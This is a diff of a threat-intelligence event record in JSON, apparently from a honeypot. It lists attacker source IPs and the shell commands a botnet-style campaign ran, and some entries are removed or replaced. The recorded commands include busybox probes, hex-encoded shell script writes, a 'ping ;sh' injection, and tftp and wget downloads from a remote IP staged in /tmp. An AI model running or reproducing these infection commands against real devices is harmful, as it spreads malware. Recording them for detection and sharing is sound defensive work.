@@ -1,7 +1,7 @@
 {
   "Event": {
-    "uuid": "0d70cd2d-372d-52e6-8802-c6f7168da72a",
-    "info": "Sundew honeypot - campaign 8c382d81d0f7 (2 sources) - enable",
+    "uuid": "0de52705-b5b7-5a7b-80ab-a94d74e579de",
+    "info": "Sundew honeypot - campaign bd531c87d32e (1 sources) - enable",
     "date": "2026-09-12",
     "analysis": "2",
     "threat_level_id": "3",
@@ -23,25 +23,16 @@
     ],
     "Attribute": [
       {
-        "uuid": "4345e469-209c-5e14-b837-a368996046d5",
+        "uuid": "4663e7be-6d5b-5efa-8ec9-764a96a35196",
         "type": "ip-src",
         "category": "Network activity",
         "to_ids": true,
-        "value": "121.142.244.108",
+        "value": "112.46.212.180",
         "timestamp": "1789243215",
-        "comment": "delivered_payload, confidence high; 1 sessions, 48 commands, 12 downloads; first_seen 2026-09-12T19:39:24.345850Z, last_seen 2026-09-12T19:41:12.811501Z; expires 7d after last_seen"
+        "comment": "delivered_payload, confidence high; 1 sessions, 19 commands, 2 downloads; first_seen 2026-09-12T07:56:00.913314Z, last_seen 2026-09-12T07:56:10.593126Z; expires 7d after last_seen"
       },
       {
-        "uuid": "094d906c-b1f9-55bf-bb44-1a9ea553e7c7",
-        "type": "ip-src",
-        "category": "Network activity",
-        "to_ids": true,
-        "value": "121.161.149.104",
-        "timestamp": "1789243215",
-        "comment": "delivered_payload, confidence high; 1 sessions, 48 commands, 12 downloads; first_seen 2026-09-11T19:57:28.345870Z, last_seen 2026-09-11T19:58:05.720822Z; expires 7d after last_seen"
-      },
-      {
-        "uuid": "8436a0b0-f97f-590f-b061-b4f2a2c39766",
+        "uuid": "8cfe079e-d84f-5933-820b-758888aa4f92",
         "type": "text",
         "category": "Artifacts dropped",
         "to_ids": false,
@@ -50,7 +41,7 @@
         "comment": "command run by this campaign"
       },
       {
-        "uuid": "b22e6f02-eee6-59c5-a916-86fc7d3b1386",
+        "uuid": "c6291e50-cc2c-5cce-b7a0-1c9e62122c8f",
         "type": "text",
         "category": "Artifacts dropped",
         "to_ids": false,
@@ -59,7 +50,7 @@
         "comment": "command run by this campaign"
       },
       {
-        "uuid": "9c9518ec-f174-5712-86f1-e00d19f5915b",
+        "uuid": "9edfb4fa-9e9d-57fc-9cee-f3b58cb24367",
         "type": "text",
         "category": "Artifacts dropped",
         "to_ids": false,
@@ -68,7 +59,7 @@
         "comment": "command run by this campaign"
       },
       {
-        "uuid": "505484d1-2a71-5f56-9d76-caf53fcfdc32",
+        "uuid": "d39bb158-6646-52b4-b154-07bea42a7fa2",
         "type": "text",
         "category": "Artifacts dropped",
         "to_ids": false,
@@ -77,146 +68,119 @@
         "comment": "command run by this campaign"
       },
       {
-        "uuid": "3fc148de-1026-56ea-9840-80b7ff5a8664",
+        "uuid": "b9347c02-c356-5f24-9f3f-de9a46413b19",
         "type": "text",
         "category": "Artifacts dropped",
         "to_ids": false,
-        "value": "linuxshell",
+        "value": "/bin/busybox fj1nICri ",
         "timestamp": "1789243215",
         "comment": "command run by this campaign"
       },
       {
-        "uuid": "c3cb8146-7424-5d28-a15c-44b78df30e55",
+        "uuid": "98ca39b3-031a-550e-b6b9-121247a8536f",
         "type": "text",
         "category": "Artifacts dropped",
         "to_ids": false,
-        "value": "ping ;sh",
+        "value": "su",
         "timestamp": "1789243215",
         "comment": "command run by this campaign"
       },
       {
-        "uuid": "c0e6ea65-d6c7-56e1-a1a0-9e2f057d74da",
+        "uuid": "63bc544f-cf28-5594-bf05-3d45cc7ff786",
         "type": "text",
         "category": "Artifacts dropped",
         "to_ids": false,
-        "value": "/bin/busybox",
+        "value": "/bin/busybox cat /proc/mounts; /bin/busybox fj1nICri ",
         "timestamp": "1789243215",
         "comment": "command run by this campaign"
       },
       {
-        "uuid": "3beb2ac6-0ce3-5902-b6d3-f527717e7302",
+        "uuid": "8f1bfb67-3bd6-5646-bff2-9332875e6639",
         "type": "text",
         "category": "Artifacts dropped",
         "to_ids": false,
-        "value": "/bin/busybox hostname PBOC",
+        "value": "/bin/busybox echo -e '\\x50\\x6f\\x72\\x74/tmp' > /tmp/.none; /bin/busybox cat /tmp/.none; /bin/busybox rm /tmp/.none",
         "timestamp": "1789243215",
         "comment": "command run by this campaign"
       },
       {
-        "uuid": "987b4406-5766-5638-a70c-e9ab62b9819f",
+        "uuid": "590a34cc-df37-59ea-b0ee-8ef9315908dc",
         "type": "text",
         "category": "Artifacts dropped",
         "to_ids": false,
-        "value": "/bin/busybox echo > /tmp/.b && sh /tmp/.b && cd /tmp/",
+        "value": "/bin/busybox echo -e '\\x50\\x6f\\x72\\x74/dev' > /dev/.none; /bin/busybox cat /dev/.none; /bin/busybox rm /dev/.none",
         "timestamp": "1789243215",
         "comment": "command run by this campaign"
       },
       {
-        "uuid": "2a173248-b956-5295-aa25-51ddb91ee943",
+        "uuid": "90818cd8-ca69-5d10-ae99-6a0037f565f5",
         "type": "text",
         "category": "Artifacts dropped",
         "to_ids": false,
-        "value": "/bin/busybox echo > /var/.b && sh /var/.b && cd /var/",
+        "value": "rm /tmp/.t; rm /tmp/.sh; rm /tmp/.human",
         "timestamp": "1789243215",
         "comment": "command run by this campaign"
       },
       {
-        "uuid": "405f8818-990c-5ea6-9f4e-3a099e168f01",
+        "uuid": "01292286-e399-501b-ab84-3cab7461f4f4",
         "type": "text",
         "category": "Artifacts dropped",
         "to_ids": false,
-        "value": "/bin/busybox echo > /var/run/.b && sh /var/run/.b && cd /var/run/",
+        "value": "cd /tmp/",
         "timestamp": "1789243215",
         "comment": "command run by this campaign"
       },
       {
-        "uuid": "3859f6ce-3ba9-5eee-914f-588bd64154ac",
+        "uuid": "2391fbeb-839f-513e-b370-4b97e15b48b9",
         "type": "text",
         "category": "Artifacts dropped",
         "to_ids": false,
-        "value": "/bin/busybox echo > /var/tmp/.b && sh /var/tmp/.b && cd /var/tmp/",
+        "value": "/bin/busybox cp /bin/echo con ; >con; /bin/busybox chmod 777 con; /bin/busybox fj1nICri ",
         "timestamp": "1789243215",
         "comment": "command run by this campaign"
       },
       {
-        "uuid": "e5ff94fa-487e-56f5-b649-1fe400d07d3a",
+        "uuid": "f7a37b40-bfd1-5e68-a89e-a5aa6e028533",
         "type": "text",
         "category": "Artifacts dropped",
         "to_ids": false,
-        "value": "/bin/busybox echo > /dev/.b && sh /dev/.b && cd /dev/",
+        "value": "/bin/busybox cat /bin/echo",
         "timestamp": "1789243215",
         "comment": "command run by this campaign"
       },
       {
-        "uuid": "dc240ab5-9145-506a-b9fb-b0def38a9121",
+        "uuid": "668cff03-b113-56c3-9546-c03112b1eea9",
         "type": "text",
         "category": "Artifacts dropped",
         "to_ids": false,
-        "value": "/bin/busybox echo > /dev/shm/.b && sh /dev/shm/.b && cd /dev/shm/",
+        "value": "/bin/busybox tftp -g -l /tmp/.none -r yCz31g9 100.70.230.68 ; cat /tmp/.none ; rm /tmp/.none ; /bin/busybox fj1nICri ",
         "timestamp": "1789243215",
         "comment": "command run by this campaign"
       },
       {
-        "uuid": "3e4e8235-8636-5084-bee3-537fc75c104b",
+        "uuid": "7b5e0746-5f77-5806-b961-764587a899dd",
         "type": "text",
         "category": "Artifacts dropped",
         "to_ids": false,
-        "value": "/bin/busybox echo > /etc/.b && sh /etc/.b && cd /etc/",
+        "value": "/bin/busybox wget http://100.70.230.68:50282/lvn3/eU -O /tmp/.none ; cat /tmp/.none ; rm /tmp/.none ; /bin/busybox fj1nICri ",
         "timestamp": "1789243215",
         "comment": "command run by this campaign"
       },
       {
-        "uuid": "fed74fcf-0d6b-553c-b5fd-83ed115531f2",
+        "uuid": "e9239d77-5c03-56ad-97ab-54d86867099b",
         "type": "text",
         "category": "Artifacts dropped",
         "to_ids": false,
-        "value": "/bin/busybox echo > /mnt/.b && sh /mnt/.b && cd /mnt/",
+        "value": "/bin/busybox echo bFRP | base64 -d; /bin/busybox echo Nkty | openssl base64 -d; /bin/busybox fj1nICri ",
         "timestamp": "1789243215",
         "comment": "command run by this campaign"
       },
       {
-        "uuid": "4743e598-0ea3-5573-b2fd-0987699b60f1",
+        "uuid": "2030fe2e-1942-587a-8d71-6687e24d31a2",
         "type": "text",
         "category": "Artifacts dropped",
         "to_ids": false,
-        "value": "/bin/busybox echo > /usr/.b && sh /usr/.b && cd /usr/",
-        "timestamp": "1789243215",
-        "comment": "command run by this campaign"
-      },
-      {
-        "uuid": "102ebb29-abed-505d-bf69-6ac22c9802c1",
-        "type": "text",
-        "category": "Artifacts dropped",
-        "to_ids": false,
-        "value": "/bin/busybox echo > /boot/.b && sh /boot/.b && cd /boot/",
-        "timestamp": "1789243215",
-        "comment": "command run by this campaign"
-      },
-      {
-        "uuid": "448afa6f-223d-5d5c-8f9d-32097bafa83c",
-        "type": "text",
-        "category": "Artifacts dropped",
-        "to_ids": false,
-        "value": "/bin/busybox echo > /home/.b && sh /home/.b && cd /home/",
-        "timestamp": "1789243215",
-        "comment": "command run by this campaign"
-      },
-      {
-        "uuid": "7de56363-a9f4-5848-bf4a-8673104c56df",
-        "type": "text",
-        "category": "Artifacts dropped",
-        "to_ids": false,
-        "value": "/bin/busybox echo -ne \"\\x23\\x21\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68\\x0A\\x0A\\x66\\x6F\\x72\\x20\\x70\\x72\\x6F\\x63\\x5F\\x64\\x69\\x72\\x20\\x69\\x6E\\x20\\x2F\\x70\\x72\\x6F\\x63\" > .k",
+        "value": "/bin/busybox echo -ne '\\xdd\\x00'; echo -ne '\\x55\\xaa'; /bin/busybox fj1nICri ",
         "timestamp": "1789243215",
         "comment": "command run by this campaign"
       }
